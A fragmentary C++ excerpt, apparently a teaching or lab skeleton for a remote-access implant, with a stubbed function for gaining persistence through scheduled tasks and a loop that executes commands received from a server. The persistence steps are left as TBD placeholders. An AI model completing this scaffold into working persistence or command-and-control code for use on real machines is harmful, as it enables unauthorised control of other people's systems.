...
string persistance()
{
    ...
    // TBD: cmd 1: list all already created scheduled tasks
    cmd = "echo PERSISTENCE NOT IMPLEMENTED YET";
    // check, whether in the list of created tasks there is our
    cmdOut = exec(cmd.c_str());
    if (cmdOut.find(serviceName) == std::string::npos)
    {
        exeFileLocation = getActualExePath();
        
        // TBD: cmd 2: create persistence with using getActualExePath()
...
int __cdecl main(int argc, char** argv)
{
    ...
    while (true)
    {
        ...
        cout << "[i] recieved command from server: " << cmd.c_str();
